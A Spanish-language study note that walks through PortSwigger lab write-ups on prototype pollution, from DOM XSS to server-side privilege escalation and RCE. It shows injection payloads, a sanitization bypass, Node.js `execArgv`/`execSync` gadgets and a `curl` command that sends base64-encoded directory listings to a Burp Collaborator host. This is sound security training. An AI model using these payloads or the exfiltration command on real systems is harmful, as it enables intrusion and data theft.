---
aliases: ["Ataque Prototype Pollution"]
tags:
  - hacking/web
estado: 🟢 Terminado
---

# Ataque Prototype Pollution

El ataque **Prototype Pollution** es una técnica que aprovecha las vulnerabilidades en la implementación de objetos en JavaScript. Esta técnica se utiliza para modificar la propiedad `prototype` de un objeto en una aplicación web, lo que puede permitir al atacante ejecutar código malicioso o manipular los datos de la aplicación.

En JavaScript, la propiedad `prototype` se utiliza para definir las propiedades y métodos de un objeto. Los atacantes pueden explotar esta característica para modificar las propiedades y métodos de un objeto y tomar el control de la aplicación.

> [!info]
> Cada objeto en JavaScript tiene un prototipo. Cuando se intenta acceder a una propiedad o método de un objeto, si este no lo posee directamente, JavaScript busca en su cadena de prototipos hasta encontrarlo o llegar a `null`. `Object.prototype` es el prototipo base del cual la mayoría de los objetos heredan.

El ataque de Prototype Pollution se produce cuando un atacante modifica la propiedad `prototype` de un objeto en una aplicación web. Esto se puede lograr mediante la manipulación de datos que se envían a través de formularios o solicitudes AJAX, o mediante la inserción de código malicioso en el código JavaScript de la aplicación.

Una vez que el objeto ha sido manipulado, el atacante puede ejecutar código malicioso en la aplicación, manipular los datos de la aplicación o tomar el control de la sesión de un usuario. Por ejemplo, un atacante podría modificar la propiedad `prototype` de un objeto de autenticación de usuario para permitir el acceso a una cuenta sin la necesidad de una contraseña.

El impacto de la explotación del ataque Prototype Pollution puede ser significativo, ya que los atacantes pueden tomar el control de la aplicación o comprometer los datos de los usuarios. Además, dado que el ataque se basa en vulnerabilidades en la implementación de objetos en JavaScript, puede ser difícil de detectar y corregir.

Para comprenderlo del todo, tenemos que entender que en JavaScript todo objeto creado, por más vacío que se encuentre, hereda las propiedades del objeto base. Un ejemplo sería:

```js
Object.prototype.hacked = "hackeado"; // Se agrega una nueva propiedad a Object.prototype

const example = {}; // Objeto vacío que hereda propiedades de Object.prototype

// Como hereda las propiedades del objeto, podemos directamente hacer un

console.log(example.hacked); // Podemos usar la propiedad hacked ya que la hereda.
```

> [!tip]
> La modificación de `Object.prototype` afecta a *todos* los objetos en la aplicación que no tengan una propiedad con el mismo nombre definida directamente. Esto puede llevar a comportamientos inesperados o a la ejecución de código malicioso en cualquier parte de la aplicación que acceda a la propiedad contaminada.

El problema real de esto es cuando nosotros podemos inyectar desde fuera, mediante peticiones POST o cualquier otra vulnerabilidad, propiedades con las cuales modificamos o alteramos la manera en la cual el flujo o contexto real de un prototipo se comporta, o creamos nuevos.

## Lab: Client-side prototype pollution via browser APIs

Comenzaremos identificando la vulnerabilidad en la URL:

Una forma de verificar si en la URL tenemos la posibilidad de inyectar prototipos es usando `?__proto__[foo]=bar` al final de la misma. Esto puede ser interpretado por algunos *frameworks* como `Object.prototype.foo = "bar"`, lo que permite la inyección:

![[Pasted image 20260225155309.png]]

Ahora, para comprobar si la inyección es válida, es tan simple como intentar desde la consola imprimir un objeto vacío como `console.log({}.foo);` y deberíamos ver `bar`.

> [!info]
> La sintaxis `__proto__` es un *accesor* (getter/setter) no estándar pero ampliamente soportado para acceder al prototipo interno de un objeto. La notación de corchetes `[foo]` se utiliza para acceder a propiedades con nombres especiales o dinámicos, lo que permite que `__proto__[foo]` sea interpretado como una propiedad del prototipo.

![[Pasted image 20260225155501.png]]

Ahora que confirmamos la vulnerabilidad, nuestro siguiente objetivo es encontrar el vector de ataque. En este caso, vamos a revisar un *script* específico que carga la web:

![[Pasted image 20260225155809.png]]

Para un análisis más detallado, examinaremos el *script* localmente:

![[Pasted image 20260225211227.png]]

Tenemos que fijarnos de forma muy atenta en el código, donde tenemos una función asíncrona dentro de la cual definimos un objeto `config`. Este tiene dos propiedades que son `params` y `transport_url`. Podemos observar a continuación cómo se redefine una propiedad específica que es `transfer_url`, donde vemos que `configurable: false` y `writable: false` definen la propiedad como no configurable y no escribible, impidiendo su eliminación o sobrescritura.

Sería fácil si la propiedad se pudiera sobrescribir directamente, pero por su configuración no se puede. Sin embargo, algo más que tenemos que tener en cuenta es que cuando el código hace `script.src = config.transport_url`, si `config.transport_url` es una propiedad heredada del prototipo que hemos contaminado, podemos controlar su valor. Podríamos intentar sobrescribir esta propiedad en el prototipo para que retorne un valor específico. Por ejemplo, lo siguiente:

![[Pasted image 20260225223018.png]]

Vemos que intenta la carga de un recurso `bar`. Podemos intentar ver en el inspector si se insertó una etiqueta `script`:

![[Pasted image 20260225223101.png]]

Como podemos observar, sí se insertó. Ahora, directamente no podemos ingresar código JavaScript porque llega al atributo `src`, no a la etiqueta. Pero podemos jugar con la propiedad `data`. Esta es una propiedad muy usada para la representación de imágenes en Base64, donde su sintaxis es: `<img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQAB.." />`. Nosotros podemos aprovechar esto debido a que podemos separar el *mime-type* sin definir por una coma y ejecutar instrucciones, quedando como `src="data:,alert(1)"`. Esto ya nos permite ejecutar una alerta y lo hacemos de la siguiente manera en el laboratorio:

> [!warning]
> El esquema URI `data:` permite incrustar pequeños archivos directamente en documentos HTML. Si se utiliza `data:,` (sin especificar un tipo MIME), el navegador a menudo intentará interpretar el contenido como texto/plain o, en el contexto de un `script.src`, como JavaScript, lo que puede llevar a la ejecución de código si el contenido es un *payload* JavaScript válido.

![[Pasted image 20260225223701.png]]

Donde al enviarlo y recargar la web vemos la alerta:

![[Pasted image 20260225223730.png]]

Y con esto el laboratorio está terminado.

![[Pasted image 20260225223750.png]]

## DOM XSS via client-side prototype pollution

Comenzamos primero viendo si mediante la URL podemos envenenar el prototipo:

![[Pasted image 20260225224304.png]]

Como podemos observar, sí queda envenenado y, por lo tanto, tenemos el *prototype pollution*.

Ahora, al igual que en otro laboratorio, tenemos un código el cual extraje y vamos a analizar:

![[Pasted image 20260225225118.png]]

![[Pasted image 20260225231317.png]]

Vemos que el código es prácticamente el mismo que el del laboratorio anterior, donde su principal diferencia radica en el hecho de que no define las reglas que nos impedían reescribir `transport_url`. Por lo tanto, la inyección queda directamente en sobrescribir `transport_url` de la siguiente manera:

![[Pasted image 20260225232243.png]]

Y ya si lo enviamos veremos la alerta:

![[Pasted image 20260225232302.png]]

Como podemos observar, tenemos la alerta y con esto el laboratorio terminado:

![[Pasted image 20260225232416.png]]

## DOM XSS via an alternative prototype pollution vector

Lo primero es identificar si tenemos un *prototype pollution* mediante la URL, como ya conocemos:

![[Pasted image 20260225232757.png]]

Se puede intentar listar `Object.prototype` para ver si encontramos `foo`, pero tampoco tenemos respuesta:
![[Pasted image 20260225232942.png]]

Como podemos observar, en este caso el vector usual no funciona y tenemos que intentar con alternativas.

Vamos a intentar inyectarlo sin corchetes de la siguiente manera `?__proto__.foo=bar`:

![[Pasted image 20260225233213.png]]

Como podemos observar, logramos inyectar `foo` dentro del prototipo. Esta es una alternativa funcional.

> [!tip]
> La notación de punto (`.`) para acceder a `__proto__` es otra forma común de realizar *prototype pollution*, especialmente cuando la notación de corchetes es filtrada o no es interpretada correctamente por alguna librería o *framework*.

Ahora, como es de costumbre, descubrimos el código y lo llevamos a local para analizarlo mejor:

![[Pasted image 20260225233542.png]]

![[Pasted image 20260225233623.png]]

Algo que aquí resalta sobre todo es directamente el `eval`. Recordemos que esa es una función vulnerable, así que primero analizamos eso y veamos si se puede hacer algo.

Si nos fijamos con atención, dentro de `eval` tenemos un condicional donde primero verifica si `manager` existe y si `manager.sequence` existe. Ahora, si nos fijamos bien al definir `window.manager` mucho más arriba, vemos que no define nada de `sequence`, por lo que en realidad no tiene nada. Tenemos una parte donde su valor es asignado a la variable `a` en caso de existir y luego también se altera su valor sumando 1, pero nada más.

En este punto, al no estar definida, podemos intentar definir `sequence` y directamente darle el valor de `alert(1)`, donde para obtener el resultado `eval` lo ejecutará. Vamos a intentarlo:

![[Pasted image 20260225235406.png]]

Vemos que no funciona, pero al revisar la consola vemos además un error. Podemos dar clic para que nos lleve a donde se efectúa:

![[Pasted image 20260225235459.png]]

Nos lleva al archivo que analizamos. Vamos a poner un *breakpoint* en la línea del `eval` para ver qué sucede en ese punto y volver a cargar:

![[Pasted image 20260225235643.png]]

Podemos observar que el valor de `alert(1)` sí llega, pero en la operación subsiguiente se le suma un `1`, resultando en `alert(1)1`, lo cual no se evalúa correctamente. Con eso claro, lo que podemos intentar hacer es jugar con operadores aritméticos como `-` o `*`. El objetivo es que se analice independientemente el `alert(1)` y luego su resultado intente operar con el `1`, pero primero lo evalúa, forzando su ejecución. Vamos a intentarlo:

> [!info]
> En JavaScript, la coerción de tipos y la precedencia de operadores pueden ser explotadas. Si `alert(1)` se evalúa como una cadena y luego se intenta una operación aritmética como `"alert(1)" - 1`, JavaScript intentará convertir la cadena a un número. Si la cadena no es un número válido, el resultado será `NaN` (Not a Number), pero la función `alert` ya se habrá ejecutado. Esto fuerza la ejecución del *payload* antes de la operación aritmética fallida.

![[Pasted image 20260226000111.png]]

![[Pasted image 20260226000332.png]]

Bueno, con esto terminamos el laboratorio:

![[Pasted image 20260226000349.png]]

## Client-side prototype pollution via flawed sanitization

Comenzamos como de costumbre intentando identificar dónde y con qué método podemos envenenar el `Object.prototype`.

![[Pasted image 20260226000931.png]]

![[Pasted image 20260226001011.png]]

Observamos que con ninguno de los métodos que ya conocemos funciona.

Bueno, no logramos encontrar el vector de inyección, así que vamos a analizar un poco el código a ver qué encontramos:

![[Pasted image 20260226001204.png]]

![[Pasted image 20260226001338.png]]

Vemos que el código es el mismo del laboratorio 1, pero no logramos la contaminación del equipo y aquí está el porqué: si nos fijamos en la siguiente función, tenemos la protección.

Aparentemente, esta función compara los valores de entrada con una lista predefinida y, si encuentra una coincidencia, la reemplaza con una cadena vacía para prevenir la inyección.

Ahora, el código solo verifica una sola vez, por lo que podemos intentar engañarlo definiendo `__pro__proto__to.foo=bar`. Al pasar por la función de protección, eliminará el primer `__proto__`, quedando en `__proto__.foo=bar`, y como no verifica nuevamente, lo deja pasar. Vamos a intentarlo:

> [!tip]
> Esta técnica de *bypass* se conoce como doble codificación o *obfuscación* para evadir filtros de una sola pasada. Al insertar una cadena que, después de una primera sanitización, se convierte en el *payload* deseado, se puede eludir la lógica de filtrado simple.

![[Pasted image 20260226002255.png]]

Como podemos observar, logramos la inyección de esta manera. En este punto, ya solo es cuestión de realizar la inyección de la siguiente manera:

![[Pasted image 20260226002420.png]]

Si lo enviamos, vamos a ver que ya nos genera la alerta:

![[Pasted image 20260226002451.png]]

Ya con esto terminamos el laboratorio.

![[Pasted image 20260226002513.png]]

## Client-side prototype pollution in third-party libraries

Bueno, en esta máquina podemos identificar primero el punto de inyección, y esto es cuestión de probar mediante diferentes métodos y formas que sí tiene. En este caso, la inyección es la siguiente:

![[Pasted image 20260226191339.png]]

Como podemos observar, ya tenemos el punto de inyección. En este caso, lo que vamos a hacer es intentar encontrar un punto de inyección [[Cross-Site Scripting XSS]], para esto analizamos los *scripts* de la web en busca de fallos.

Según la documentación de PortSwigger, podemos buscar manualmente utilizando:

```js
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

El proceso es el siguiente: nosotros tenemos que probar de forma manual, por diferentes tipos de peticiones, pasándole una propiedad. El objetivo es que si la propiedad que le pasamos es vulnerable, invocamos al *getter*, donde al mismo forzamos una salida por consola con el texto `polluted`. Entonces, lo primero es capturar la respuesta principal de la petición original en Burp Suite para manipularla:

![[Pasted image 20260226194134.png]]

Ahora modificamos antes del primer *script* para lograr poner un *debugger* de la siguiente manera:

![[Pasted image 20260226194224.png]]

Esto lo vamos a enviar y veremos lo siguiente en el navegador:

![[Pasted image 20260226194304.png]]

Como observamos, se paró la ejecución. El punto ahora es en la consola ir probando mediante el código proporcionado diferentes propiedades. El proceso es tedioso y repetitivo, pero certero.

Vamos a ver que al usar la propiedad `hitCallback`:

![[Pasted image 20260226194538.png]]

Tenemos que darle a *play* y veamos el resultado:
![[Pasted image 20260226194638.png]]

Vemos que en realidad se ejecuta el *trace* y también nos informa que `polluted` no está definido, y es lo que buscamos.

Vamos a revisar por qué nos da el punto exacto del fallo para saber dónde lo ejecuta exactamente y cómo. El objetivo de saber es poder adaptar el código malicioso a cómo se está interpretando.

![[Pasted image 20260226194939.png]]

Entendiendo un poco el código, vemos que llega el objeto `a` a la función, donde de este objeto se extrae el valor de `tc` mediante su *getter*, donde se almacena en la variable `c`. Ahora, esta variable llega a ser interpretada dentro de un `setTimeout`, entendiendo que el mismo lo evalúa y es allí donde podemos obtener la ejecución de código. Vamos a intentar entonces directamente a `hitCallback` asignarle un `alert(1)` para ver si es válido:

> [!info]
> La función `setTimeout()` en JavaScript puede ejecutar código pasado como una cadena. Si un valor contaminado se utiliza como argumento de `setTimeout` y este valor es una cadena que contiene código JavaScript, se ejecutará. Esto es un vector común para XSS basado en DOM.

![[Pasted image 20260226195522.png]]

Como podemos observar, sí es válido, por lo que ahora tenemos que exfiltrar la *cookie* de sesión de la víctima, y para esto necesitamos hacer que esta ingrese directamente en la inyección. Esto con el servidor de *exploits* proporcionado es mucho más sencillo, quedando de la siguiente manera:

![[Pasted image 20260226195735.png]]

Almacenamos y enviamos a ver qué obtenemos:

![[Pasted image 20260226195758.png]]

Listo, la máquina queda resuelta.

## Privilege escalation via server-side prototype pollution

En este laboratorio vamos a ver cómo es posible elevar el privilegio de un usuario.

Lo primero es entrar con el usuario que nos dan y vemos el siguiente panel:

![[{9B6CB500-35BF-483F-8BD4-56B4B17AC716}.png]]

Veamos cómo se tramitan estos datos al momento de enviarlos:

![[{475CD6BA-666A-4982-9714-55965998283A}.png]]

Observamos que la data se tramita por JSON. Veamos la respuesta trabajando en el *repeater*:

![[Pasted image 20260226212957.png]]

Vemos muchos más datos en la respuesta, donde en realidad tenemos un `isAdmin`, presumiblemente un indicador de privilegios administrativos.

Directamente no podemos afectarlo, pero mediante un truco o diferentes trucos esto es posible.

Nosotros solo podemos suponer el funcionamiento de las webs, ya que no conocemos cómo están construidas. Por lo tanto, lo que podemos imaginar por detrás de esta petición al llegar al servidor es que el mismo haga algo como:

```js
const body = JSON.parse(requestBody)
```

Lo que hace es convertir el texto JSON que se le envía mediante la solicitud en un objeto JavaScript para poder obtener los valores de cada uno. Aquí es donde entra nuestro truco, porque si esto es un objeto y es interpretado como tal, podríamos enviar algo de la siguiente manera:

![[Pasted image 20260226213916.png]]

Lo que sucede es que no crea una propiedad literal `__proto__`, sino que es interpretado por el motor JavaScript subyacente como una referencia para modificar `Object.prototype`, lo que constituye un punto de inyección.

Para comprobar, podemos enviar esto y ver si en la respuesta lo representa:

![[Pasted image 20260226214142.png]]

Como podemos observar, tenemos ya la nueva propiedad `foo` y como tal no se encuentra en el objeto, sino dentro del prototipo, pero el acceso es el mismo.

Bueno, con esto ya en conocimiento, podemos intentar alterar la propiedad de `isAdmin`. Claro, esto no lo altera directamente, sino que al asignarse en el prototipo, se convierte en una propiedad heredada con un valor específico, por lo tanto, podríamos llegar a alterarla de forma indirecta:

![[Pasted image 20260226214435.png]]

Como podemos ver, mediante la modificación del prototipo y porque la aplicación lo permite, podemos llegar a alterar propiedades existentes.

![[Pasted image 20260226214544.png]]

Como vemos, ya somos administradores y podemos terminar el laboratorio:

![[Pasted image 20260226214639.png]]

## Detecting server-side prototype pollution without polluted property reflection

Al igual que en el laboratorio anterior, vamos a tener un apartado para enviar o actualizar datos, lo que vamos a capturar directamente:

![[Pasted image 20260226220821.png]]

Observamos directamente la petición y la respuesta.

En este laboratorio no se nos pide escalar directamente a administrador, sino realizar un cambio sutil pero perceptible. Para esto, algo que podemos hacer es inducir un error en el envío de datos para observar la respuesta del servidor:

![[Pasted image 20260226221134.png]]

El error es haber quitado una comilla y vemos que el servidor responde con el objeto `error`, el cual contiene varias propiedades. Podemos intentar alterar en este caso la propiedad de `status`:

![[Pasted image 20260226221357.png]]

Directamente en la respuesta no vemos nada, pero ¿y si forzamos un error?

![[Pasted image 20260226221441.png]]

Como observamos, logramos obligar al servidor a responder ante el error como `405` y no como `400` que era en un comienzo, por lo que sí heredó la propiedad definida mediante la inyección del prototipo al `Object.prototype`.

![[Pasted image 20260226221556.png]]

## Bypassing flawed input filters for server-side prototype pollution

El objetivo es sobrepasar filtros de entrada defectuosos para generar un *prototype pollution* del lado del servidor.

Comenzamos directo ya capturando la petición:

![[Pasted image 20260226221937.png]]

De la forma clásica, como en anteriores laboratorios, no vamos a lograr contaminar el prototipo.

Para este caso, vamos a contaminar utilizando la propiedad `constructor` con la siguiente sintaxis:

```json
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

Así que vamos a probarlo:

> [!info]
> La propiedad `constructor` de un objeto hace referencia a la función constructora que creó la instancia. Al acceder a `constructor.prototype`, se puede modificar el prototipo de la función constructora, lo que a su vez afecta a todas las instancias creadas por esa función. Esto es un vector alternativo para *prototype pollution*.

![[Pasted image 20260226222422.png]]

Podemos observar cómo se insertaron las propiedades que definimos. Usualmente se usa `json spaces` para definir el valor del tabulador. En este caso no se aplica del todo, pero es una forma de validar si se aplica la inyección.

Ya validado, realicemos la inyección a `isAdmin`:

![[Pasted image 20260226222919.png]]

Vemos que la inyección es válida, por lo cual vamos a completar el laboratorio eliminando al usuario 'carlos':

![[Pasted image 20260226223018.png]]

## Remote code execution via server-side prototype pollution

Bueno, como ya se ha hecho, vamos directo a interceptar la petición y la respuesta para ver cómo se está tramitando todo:

![[Pasted image 20260226223706.png]]

Vemos que directamente ya tenemos privilegios de administrador. Vamos al panel a ver qué encontramos:

![[Pasted image 20260226223838.png]]

Vemos que podemos ejecutar una serie de tareas de mantenimiento. Veamos cómo es que esto se tramita:

![[Pasted image 20260226224050.png]]

Vemos que se realizan ciertas tareas tanto para la base de datos como para los archivos.

El objetivo primero sería ver si podemos realizar una inyección:

![[Pasted image 20260226224322.png]]

En la petición original sí se realiza sin problema la inyección.

Bueno, tenemos que comprender ahora que, viendo que es válida, cuando ejecutamos tareas de limpieza en el servidor, usualmente y como buena práctica, en realidad se genera un proceso hijo para la ejecución de las tareas. Y como nos hablan de tener implementadas tecnologías como Node.js, lo que puedo pensar es que se utilicen módulos como `child_process.fork()`, donde se genera el nuevo proceso hijo.

Ahora, algo que tenemos que saber es que a este módulo se le pasa el recurso (el *script* que ejecuta las tareas), algunos argumentos y generalmente las opciones. Aquí lo que sucede es que en las opciones se puede incorporar `execArgv`, donde se puede enviar una lista de *flags* al binario de Node.js cuando lanza los procesos, y uno de estos comandos que se pueden ejecutar es `--eval`, mediante el cual se puede ejecutar código.

Bueno, una forma de jugar con eso sería de la siguiente manera:

![[Pasted image 20260226225643.png]]

Vamos a representarlo y dejarlo en la petición a ver si logramos algo:

![[Pasted image 20260226230051.png]]

En este punto ya contaminamos el `Object.prototype` de forma global, donde cualquier objeto que no contenga su propia propiedad `execArgv` la heredará de forma contaminada. En este punto, lo que vamos a hacer es ejecutar una limpieza:

![[Pasted image 20260226230233.png]]

## Exfiltrating sensitive data via server-side prototype pollution

Tenemos que lograr primero la inyección. Una vez que tenemos esta lista, tenemos que identificar el *gadget* con el cual vamos a trabajar y mediante el cual tenemos que obtener el contenido de `/home/carlos` mediante una ejecución de comandos y obtener al final el contenido de un archivo secreto dentro de ese directorio.

Bueno, es un laboratorio muy similar al anterior donde ya somos administradores, tenemos los permisos de administrador, pero vamos a ver las dos peticiones: cuando enviamos datos y cuando realizamos la limpieza:

![[Pasted image 20260226230830.png]]

![[Pasted image 20260226230840.png]]

Vemos las dos peticiones, simplemente igual al laboratorio anterior, donde vamos directamente primero a intentar una inyección a ver si es válida:

![[Pasted image 20260226231020.png]]

Vemos que tenemos la misma inyección, por lo que siguiendo la misma lógica de la máquina anterior. Ahora no vamos a lograr una conexión directa, eso sí, por lo que mediante investigación a la función `execSync` obtenemos que podemos pasarle parámetros como `shell` e `input`. Aquí está el truco y es que `shell` admite `vim`, el cual mediante el `:! <comando>` podemos nosotros ejecutar comandos. Por lo tanto, usando estas dos entradas queda:

> [!tip]
> La función `execSync` de Node.js ejecuta un comando de forma síncrona. Al manipular sus opciones a través de *prototype pollution*, podemos controlar el `shell` utilizado y el `input` que se le pasa. Si el `shell` es `vim`, podemos usar su funcionalidad de ejecución de comandos (`:!`) para lograr RCE.

![[Pasted image 20260226232253.png]]

Ahora es cuestión de ejecutar la limpieza y ver si logramos obtener algo dentro del Burp Collaborator:

![[Pasted image 20260226232417.png]]

Como podemos observar, sí llegó y es realizado mediante `curl`.

Ya con esto, vamos a aprovechar para ejecutar un comando de la siguiente manera:

```bash
ls -l /home/carlos | base64 | curl -d @- <burpCollaborator>
```

Lo que hacemos en este punto es enviar la salida en Base64 del comando `ls /home/carlos` a nuestro Burp Collaborator:

![[Pasted image 20260226232820.png]]

Como se observa, envenenamos nuevamente y vamos a darle a la limpieza y veamos si funciona:

![[Pasted image 20260226232909.png]]

Pues al parecer está funcionando excelente:

![[Pasted image 20260226232948.png]]

Vemos el archivo `secret`. Siguiendo el mismo concepto, vamos a enviar el contenido de `secret`:

![[Pasted image 20260226233039.png]]

Ahora ya veamos si al ejecutar la limpieza nos llega el contenido:

![[Pasted image 20260226233126.png]]

Excelente, veamos el contenido:

![[Pasted image 20260226233228.png]]

Pasemos esto al laboratorio y terminemos.

![[Pasted image 20260226233302.png]]